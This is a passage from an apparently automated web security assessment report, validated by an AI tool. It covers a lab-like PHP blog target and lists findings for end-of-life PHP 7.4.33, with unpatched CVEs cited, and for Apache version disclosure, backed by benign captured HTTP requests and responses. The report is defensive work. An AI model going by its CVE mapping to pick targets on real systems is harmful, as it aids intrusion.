+    &lt;!-- Bootstrap core JavaScript --&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 3. [vulnerable-component] End-of-life PHP 7.4.33 — unsupported branch, unpatched post-EOL CVEs (incl. phar RCE-class CVE-2023-3824)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32844/</div>
+<div class="desc">VERSION-BASED finding (matched by banner, not yet exploited). Dynamic `.php` responses advertise `X-Powered-By: PHP/7.4.33` (captured by fingerprint_scan on `/`; present on the 200 PHP pages and absent on the static 404, which Apache serves without invoking PHP). PHP 7.4 reached END OF LIFE on 2022-11-28, and 7.4.33 is the FINAL release of the 7.4 branch — it receives no further security updates. Multiple CVEs discovered after EOL were fixed only in the supported 8.x branches and remain UNPATCHED in 7.4.33:
+
+- CVE-2023-3824 (HIGH) — stack buffer overflow when reading PHAR directory entries → memory corruption / potential RCE; fixed in 8.0.30 / 8.1.22 / 8.2.8. 7.4 was already EOL and never received the fix.
+- CVE-2023-3823 (HIGH) — XML/libxml external-entity &amp; global-state issue → information disclosure; fixed in the same 8.x releases, unpatched in 7.4.
+- CVE-2024-5458 — filter_var() FILTER_VALIDATE_URL parsing bypass; fixed in 8.x, unpatched in 7.4.
+- CVE-2024-3096 — password_verify() returns true for some inputs containing a null byte; fixed in 8.x, unpatched in 7.4.
+
+Note: CVE-2024-4577 (PHP-CGI argument-injection RCE) is Windows/Best-Fit-encoding specific and this host is Debian/Linux, so it is NOT cited as applicable here. The core issue is that the runtime is on an unsupported branch: even beyond the specific CVEs above, any future PHP vulnerability will not be patched for 7.4. Recommend migrating to a supported PHP release (8.2+).</div>
+<div><b>Reproduction</b></div><pre>1. `GET /` (or any `.php` page). 2. Observe `X-Powered-By: PHP/7.4.33` in the response headers. 3. Confirm 7.4 EOL status (php.net supported-versions: 7.4 EOL 2022-11-28) and that the listed CVEs were fixed only in 8.x branches, leaving 7.4.33 unpatched.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyst4kf-4k</code> — <code>artifacts/_/ev-mqyst4kf-4k/</code></div><div class="lbl">REQUEST</div><pre>GET /verdict-nonexistent-xyz-404 HTTP/1.1
+Host: target.local:32844
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: Keep-Alive
+content-length: 279
+content-type: text/html; charset=iso-8859-1
+date: Mon, 29 Jun 2026 05:49:48 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.54 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.54 (Debian) Server at target.local Port 32844&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqysucwp-4l</code> — <code>artifacts/_/ev-mqysucwp-4l/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32844
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 9188
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 05:50:46 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF8&quot;&gt;
+    &lt;title&gt;Encoder64 Blog&lt;/title&gt;
+    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;!-- Navigation Bar --&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;!-- Navbar content split into two halves with flexbox --&gt;
+        &lt;div class=&quot;d-flex justify-content-between w-100&quot;&gt;
+            &lt;!-- Left side with &quot;Encoder64 Blog&quot; --&gt;
+            &lt;a class=&quot;navbar-brand&quot; href=&quot;/index.php&quot;&gt;Encoder64 Blog&lt;/a&gt;
+
+            &lt;!-- Right side with navigation links and toggler button --&gt;
+            &lt;div&gt;
+                &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-bs-toggle=&quot;collapse&quot; data-bs-target=&quot;#navbarNavAltMarkup&quot; aria-controls=&quot;navbarNavAltMarkup&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+                    &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+                &lt;/button&gt;
+                &lt;div class=&quot;collapse navbar-collapse justify-content-end&quot; id=&quot;navbarNavAltMarkup&quot;&gt;
+                    &lt;div class=&quot;navbar-nav&quot;&gt;
+                        &lt;a class=&quot;nav-link active&quot; aria-current=&quot;page&quot; href=&quot;/index.php&quot;&gt;Home&lt;/a&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/about.php&quot;&gt;About&lt;/a&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/contact.php&quot;&gt;Contact&lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/nav&gt;
+
+    &lt;!-- Header with Featured Post --&gt;
+    &lt;header class=&quot;py-5 bg-light border-bottom mb-4&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;div class=&quot;text-center my-5&quot;&gt;
+                &lt;h1 class=&quot;fw-bolder&quot;&gt;Welcome to Encoder64 Blog!&lt;/h1&gt;
+                &lt;p class=&quot;lead mb-0&quot;&gt;e0knbV9hX1NjcmlwdF9LaWRkaWV9&lt;/p&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/header&gt;
+
+    &lt;!-- Main Content Section --&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;!-- Blog Entries Column --&gt;
+            &lt;div class=&quot;col-md-8&quot;&gt;
+                                    &lt;div class=&quot;card mb-4&quot;&gt;
+                        &lt;img class=&quot;card-img-top img-fluid&quot; src=&quot;static/images/EternalBlue.webp&quot; style=&quot;max-height: 300px; object-fit: cover;&quot; alt=&quot;EternalBlue: Understanding the Exploit&quot;&gt;
+                        &lt;div class=&quot;card-body&quot;&gt;
+                            &lt;h2 class=&quot;card-title&quot;&gt;EternalBlue: Understanding the Exploit&lt;/h2&gt;
+                            &lt;p class=&quot;card-text&quot;&gt;Exploring the NSA-developed cyberattack exploit known as EternalBlue, which targets Microsoft's SMB protocol.&lt;/p&gt;
+                            &lt;a href=&quot;post.php?id=EternalBlue.php&quot; class=&quot;btn btn-primary&quot;&gt;Read More →&lt;/a&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                                    &lt;div class=&quot;card mb-4&quot;&gt;
+                        &lt;img class=&quot;card-img-top img-fluid&quot; src=&quot;static/images/ML.webp&quot; style=&quot;max-height: 300px; object-fit: cover;&quot; alt=&quot;Introduction to Machine Learning&quot;&gt;
+                        &lt;div class=&quot;card-body&quot;&gt;
+                            &lt;h2 class=&quot;card-title&quot;&gt;Introduction to Machine Learning&lt;/h2&gt;
+                            &lt;p class=&quot;card-text&quot;&gt;A primer on machine learning, highlighting its role in data prediction without explicit programming.&lt;/p&gt;
+                            &lt;a href=&quot;post.php?id=Introduction-to-Machine-Learning.php&quot; class=&quot;btn btn-primary&quot;&gt;Read More →&lt;/a&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                                    &lt;div class=&quot;card mb-4&quot;&gt;
+                        &lt;img class=&quot;card-img-top img-fluid&quot; src=&quot;static/images/Cybersecurity.webp&quot; style=&quot;max-height: 300px; object-fit: cover;&quot; alt=&quot;The Importance of Cybersecurity&quot;&gt;
+                        &lt;div class=&quot;card-body&quot;&gt;
+                            &lt;h2 class=&quot;card-title&quot;&gt;The Importance of Cybersecurity&lt;/h2&gt;
+                            &lt;p class=&quot;card-text&quot;&gt;Discussing the critical importance of protecting digital information in an increasingly interconnected world.&lt;/p&gt;
+                            &lt;a href=&quot;post.php?id=The-Importance-of-Cybersecurity.php&quot; class=&quot;btn btn-primary&quot;&gt;Read More →&lt;/a&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                                    &lt;div class=&quot;card mb-4&quot;&gt;
+                        &lt;img class=&quot;card-img-top img-fluid&quot; src=&quot;static/images/Renew.webp&quot; style=&quot;max-height: 300px; object-fit: cover;&quot; alt=&quot;Advances in Renewable Energy&quot;&gt;
+                        &lt;div class=&quot;card-body&quot;&gt;
+                            &lt;h2 class=&quot;card-title&quot;&gt;Advances in Renewable Energy&lt;/h2&gt;
+                            &lt;p class=&quot;card-text&quot;&gt;Reviewing the latest advances in renewable energy technologies and their impact on global energy consumption.&lt;/p&gt;
+                            &lt;a href=&quot;post.php?id=Advances-in-Renewable-Energy.php&quot; class=&quot;btn btn-primary&quot;&gt;Read More →&lt;/a&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                                    &lt;div class=&quot;card mb-4&quot;&gt;
+                        &lt;img class=&quot;card-img-top img-fluid&quot; src=&quot;static/images/Blockchain.webp&quot; style=&quot;max-height: 300px; object-fit: cover;&quot; alt=&quot;Blockchain Technology Explained&quot;&gt;
+                        &lt;div class=&quot;card-body&quot;&gt;
+                            &lt;h2 class=&quot;card-title&quot;&gt;Blockchain Technology Explained&lt;/h2&gt;
+                            &lt;p class=&quot;card-text&quot;&gt;Explaining the foundational technology behind cryptocurrencies and its potential beyond financial transactions.&lt;/p&gt;
+                            &lt;a href=&quot;post.php?id=Blockchain-Technology.php&quot; class=&quot;btn btn-primary&quot;&gt;Read More →&lt;/a&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                
+                &lt;!-- Pagination --&gt;
+                &lt;ul class=&quot;pagination justify-content-center mb-4&quot;&gt;
+                                            &lt;li class=&quot;page-item active&quot;&gt;
+                            &lt;a class=&quot;page-link&quot; href=&quot;?page=1&quot;&gt;1&lt;/a&gt;
+                        &lt;/li&gt;
+                                            &lt;li class=&quot;page-item &quot;&gt;
+                            &lt;a class=&quot;page-link&quot; href=&quot;?page=2&quot;&gt;2&lt;/a&gt;
+                        &lt;/li&gt;
+                                    &lt;/ul&gt;
+
+            &lt;/div&gt;
+
+            &lt;!-- Sidebar Widgets Column --&gt;
+            &lt;div class=&quot;col-md-4&quot;&gt;
+    &lt;!-- Search Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Search&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;div class=&quot;input-group&quot;&gt;
+                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;Search for...&quot;&gt;
+                &lt;span class=&quot;input-group-append&quot;&gt;
+                    &lt;button class=&quot;btn btn-secondary&quot; type=&quot;button&quot;&gt;Go!&lt;/button&gt;
+                &lt;/span&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Categories Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Categories&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;div class=&quot;row&quot;&gt;
+                &lt;div class=&quot;col-lg-6&quot;&gt;
+                    &lt;ul class=&quot;list-unstyled mb-0&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Web Design&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;HTML&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Freebies&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-lg-6&quot;&gt;
+                    &lt;ul class=&quot;list-unstyled mb-0&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;CSS&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Tutorials&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Side Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Live Visitors&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;h6&gt;Current Live Visitors: &lt;span id=&quot;visitorCount&quot;&gt;0&lt;/span&gt;&lt;/h6&gt;
+            &lt;p&gt;Top Countries:&lt;/p&gt;
+            &lt;ul id=&quot;visitorCountries&quot;&gt;
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+    document.addEventListener('DOMContentLoaded', function() {
+        const countries = [&quot;Argentina&quot;, &quot;Poland&quot;, &quot;USA&quot;, &quot;Canada&quot;, &quot;Brazil&quot;, &quot;India&quot;, &quot;Germany&quot;, &quot;France&quot;, &quot;Australia&quot;, &quot;Japan&quot;, &quot;South Korea&quot;, &quot;South Africa&quot;];
+        
+        function updateVisitors() {
+            const visitorCount = Math.floor(Math.random() * 500) + 100;
+            document.getElementById('visitorCount').innerText = visitorCount;
+            const selectedCountries = [];
+            for (let i = 0; i &lt; 3; i++) {
+                const index = Math.floor(Math.random() * countries.length);
+                if (!selectedCountries.includes(countries[index])) {
+                    selectedCountries.push(countries[index]);
+                }
+            }
+            const ul = document.getElementById('visitorCountries');
+            ul.innerHTML = &quot;&quot;;
+            selectedCountries.forEach(country =&gt; {
+                const li = document.createElement('li');
+                li.innerText = country;
+                ul.appendChild(li);
+            });
+        }
+        updateVisitors();
+        setInterval(updateVisitors, 5000);
+    });
+&lt;/script&gt;        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap core JavaScript --&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqysudm6-4m</code> — <code>artifacts/_/ev-mqysudm6-4m/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32844
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 9188
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 05:50:47 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF8&quot;&gt;
+    &lt;title&gt;Encoder64 Blog&lt;/title&gt;
+    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;!-- Navigation Bar --&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;!-- Navbar content split into two halves with flexbox --&gt;
+        &lt;div class=&quot;d-flex justify-content-between w-100&quot;&gt;
+            &lt;!-- Left side with &quot;Encoder64 Blog&quot; --&gt;
+            &lt;a class=&quot;navbar-brand&quot; href=&quot;/index.php&quot;&gt;Encoder64 Blog&lt;/a&gt;
+
+            &lt;!-- Right side with navigation links and toggler button --&gt;
+            &lt;div&gt;
+                &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-bs-toggle=&quot;collapse&quot; data-bs-target=&quot;#navbarNavAltMarkup&quot; aria-controls=&quot;navbarNavAltMarkup&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+                    &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+                &lt;/button&gt;
+                &lt;div class=&quot;collapse navbar-collapse justify-content-end&quot; id=&quot;navbarNavAltMarkup&quot;&gt;
+                    &lt;div class=&quot;navbar-nav&quot;&gt;
+                        &lt;a class=&quot;nav-link active&quot; aria-current=&quot;page&quot; href=&quot;/index.php&quot;&gt;Home&lt;/a&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/about.php&quot;&gt;About&lt;/a&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/contact.php&quot;&gt;Contact&lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/nav&gt;
+
+    &lt;!-- Header with Featured Post --&gt;
+    &lt;header class=&quot;py-5 bg-light border-bottom mb-4&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;div class=&quot;text-center my-5&quot;&gt;
+                &lt;h1 class=&quot;fw-bolder&quot;&gt;Welcome to Encoder64 Blog!&lt;/h1&gt;
+                &lt;p class=&quot;lead mb-0&quot;&gt;e0knbV9hX1NjcmlwdF9LaWRkaWV9&lt;/p&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/header&gt;
+
+    &lt;!-- Main Content Section --&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;!-- Blog Entries Column --&gt;
+            &lt;div class=&quot;col-md-8&quot;&gt;
+                                    &lt;div class=&quot;card mb-4&quot;&gt;
+                        &lt;img class=&quot;card-img-top img-fluid&quot; src=&quot;static/images/EternalBlue.webp&quot; style=&quot;max-height: 300px; object-fit: cover;&quot; alt=&quot;EternalBlue: Understanding the Exploit&quot;&gt;
+                        &lt;div class=&quot;card-body&quot;&gt;
+                            &lt;h2 class=&quot;card-title&quot;&gt;EternalBlue: Understanding the Exploit&lt;/h2&gt;
+                            &lt;p class=&quot;card-text&quot;&gt;Exploring the NSA-developed cyberattack exploit known as EternalBlue, which targets Microsoft's SMB protocol.&lt;/p&gt;
+                            &lt;a href=&quot;post.php?id=EternalBlue.php&quot; class=&quot;btn btn-primary&quot;&gt;Read More →&lt;/a&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                                    &lt;div class=&quot;card mb-4&quot;&gt;
+                        &lt;img class=&quot;card-img-top img-fluid&quot; src=&quot;static/images/ML.webp&quot; style=&quot;max-height: 300px; object-fit: cover;&quot; alt=&quot;Introduction to Machine Learning&quot;&gt;
+                        &lt;div class=&quot;card-body&quot;&gt;
+                            &lt;h2 class=&quot;card-title&quot;&gt;Introduction to Machine Learning&lt;/h2&gt;
+                            &lt;p class=&quot;card-text&quot;&gt;A primer on machine learning, highlighting its role in data prediction without explicit programming.&lt;/p&gt;
+                            &lt;a href=&quot;post.php?id=Introduction-to-Machine-Learning.php&quot; class=&quot;btn btn-primary&quot;&gt;Read More →&lt;/a&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                                    &lt;div class=&quot;card mb-4&quot;&gt;
+                        &lt;img class=&quot;card-img-top img-fluid&quot; src=&quot;static/images/Cybersecurity.webp&quot; style=&quot;max-height: 300px; object-fit: cover;&quot; alt=&quot;The Importance of Cybersecurity&quot;&gt;
+                        &lt;div class=&quot;card-body&quot;&gt;
+                            &lt;h2 class=&quot;card-title&quot;&gt;The Importance of Cybersecurity&lt;/h2&gt;
+                            &lt;p class=&quot;card-text&quot;&gt;Discussing the critical importance of protecting digital information in an increasingly interconnected world.&lt;/p&gt;
+                            &lt;a href=&quot;post.php?id=The-Importance-of-Cybersecurity.php&quot; class=&quot;btn btn-primary&quot;&gt;Read More →&lt;/a&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                                    &lt;div class=&quot;card mb-4&quot;&gt;
+                        &lt;img class=&quot;card-img-top img-fluid&quot; src=&quot;static/images/Renew.webp&quot; style=&quot;max-height: 300px; object-fit: cover;&quot; alt=&quot;Advances in Renewable Energy&quot;&gt;
+                        &lt;div class=&quot;card-body&quot;&gt;
+                            &lt;h2 class=&quot;card-title&quot;&gt;Advances in Renewable Energy&lt;/h2&gt;
+                            &lt;p class=&quot;card-text&quot;&gt;Reviewing the latest advances in renewable energy technologies and their impact on global energy consumption.&lt;/p&gt;
+                            &lt;a href=&quot;post.php?id=Advances-in-Renewable-Energy.php&quot; class=&quot;btn btn-primary&quot;&gt;Read More →&lt;/a&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                                    &lt;div class=&quot;card mb-4&quot;&gt;
+                        &lt;img class=&quot;card-img-top img-fluid&quot; src=&quot;static/images/Blockchain.webp&quot; style=&quot;max-height: 300px; object-fit: cover;&quot; alt=&quot;Blockchain Technology Explained&quot;&gt;
+                        &lt;div class=&quot;card-body&quot;&gt;
+                            &lt;h2 class=&quot;card-title&quot;&gt;Blockchain Technology Explained&lt;/h2&gt;
+                            &lt;p class=&quot;card-text&quot;&gt;Explaining the foundational technology behind cryptocurrencies and its potential beyond financial transactions.&lt;/p&gt;
+                            &lt;a href=&quot;post.php?id=Blockchain-Technology.php&quot; class=&quot;btn btn-primary&quot;&gt;Read More →&lt;/a&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                
+                &lt;!-- Pagination --&gt;
+                &lt;ul class=&quot;pagination justify-content-center mb-4&quot;&gt;
+                                            &lt;li class=&quot;page-item active&quot;&gt;
+                            &lt;a class=&quot;page-link&quot; href=&quot;?page=1&quot;&gt;1&lt;/a&gt;
+                        &lt;/li&gt;
+                                            &lt;li class=&quot;page-item &quot;&gt;
+                            &lt;a class=&quot;page-link&quot; href=&quot;?page=2&quot;&gt;2&lt;/a&gt;
+                        &lt;/li&gt;
+                                    &lt;/ul&gt;
+
+            &lt;/div&gt;
+
+            &lt;!-- Sidebar Widgets Column --&gt;
+            &lt;div class=&quot;col-md-4&quot;&gt;
+    &lt;!-- Search Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Search&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;div class=&quot;input-group&quot;&gt;
+                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;Search for...&quot;&gt;
+                &lt;span class=&quot;input-group-append&quot;&gt;
+                    &lt;button class=&quot;btn btn-secondary&quot; type=&quot;button&quot;&gt;Go!&lt;/button&gt;
+                &lt;/span&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Categories Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Categories&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;div class=&quot;row&quot;&gt;
+                &lt;div class=&quot;col-lg-6&quot;&gt;
+                    &lt;ul class=&quot;list-unstyled mb-0&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Web Design&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;HTML&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Freebies&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-lg-6&quot;&gt;
+                    &lt;ul class=&quot;list-unstyled mb-0&quot;&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;CSS&lt;/a&gt;&lt;/li&gt;
+                        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Tutorials&lt;/a&gt;&lt;/li&gt;
+                    &lt;/ul&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Side Widget --&gt;
+    &lt;div class=&quot;card my-4&quot;&gt;
+        &lt;h5 class=&quot;card-header&quot;&gt;Live Visitors&lt;/h5&gt;
+        &lt;div class=&quot;card-body&quot;&gt;
+            &lt;h6&gt;Current Live Visitors: &lt;span id=&quot;visitorCount&quot;&gt;0&lt;/span&gt;&lt;/h6&gt;
+            &lt;p&gt;Top Countries:&lt;/p&gt;
+            &lt;ul id=&quot;visitorCountries&quot;&gt;
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+    document.addEventListener('DOMContentLoaded', function() {
+        const countries = [&quot;Argentina&quot;, &quot;Poland&quot;, &quot;USA&quot;, &quot;Canada&quot;, &quot;Brazil&quot;, &quot;India&quot;, &quot;Germany&quot;, &quot;France&quot;, &quot;Australia&quot;, &quot;Japan&quot;, &quot;South Korea&quot;, &quot;South Africa&quot;];
+        
+        function updateVisitors() {
+            const visitorCount = Math.floor(Math.random() * 500) + 100;
+            document.getElementById('visitorCount').innerText = visitorCount;
+            const selectedCountries = [];
+            for (let i = 0; i &lt; 3; i++) {
+                const index = Math.floor(Math.random() * countries.length);
+                if (!selectedCountries.includes(countries[index])) {
+                    selectedCountries.push(countries[index]);
+                }
+            }
+            const ul = document.getElementById('visitorCountries');
+            ul.innerHTML = &quot;&quot;;
+            selectedCountries.forEach(country =&gt; {
+                const li = document.createElement('li');
+                li.innerText = country;
+                ul.appendChild(li);
+            });
+        }
+        updateVisitors();
+        setInterval(updateVisitors, 5000);
+    });
+&lt;/script&gt;        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap core JavaScript --&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-4">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 4. [info-disclosure] Apache version disclosed in 404 error pages</h3>
+<div class="kv">Screen: <code>s-0002</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32844/</div>
+<div class="desc">Any request to a non-existent path returns a default Apache 404 page that includes the full server version string: &quot;Apache/2.4.54 (Debian) Server at target.local Port 32844&quot;. This reveals the web server software name, version, and OS distribution, which an attacker can use to look up version-specific CVEs. The `ServerTokens Prod` directive (or equivalent) would suppress this.</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:32844/nonexistent_page.php
+2. Observe the 404 response body: contains &quot;Apache/2.4.54 (Debian) Server at ...&quot;
+3. Repeat with any non-existent path — same disclosure every time.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyrgb8t-9</code> — <code>artifacts/s-0002/ev-mqyrgb8t-9/</code></div><div class="lbl">REQUEST</div><pre>GET /about.php HTTP/1.1
+Host: target.local:32844
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 7358
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 05:11:51 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF8&quot;&gt;
+    &lt;title&gt;Encoder64 Blog | About&lt;/title&gt;
+    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;!-- Navigation Bar --&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;!-- Navbar content split into two halves with flexbox --&gt;
+        &lt;div class=&quot;d-flex justify-content-between w-100&quot;&gt;
+            &lt;!-- Left side with &quot;Encoder64 Blog&quot; --&gt;
+            &lt;a class=&quot;navbar-brand&quot; href=&quot;/index.php&quot;&gt;Encoder64 Blog&lt;/a&gt;
+
+            &lt;!-- Right side with navigation links and toggler button --&gt;
+            &lt;div&gt;
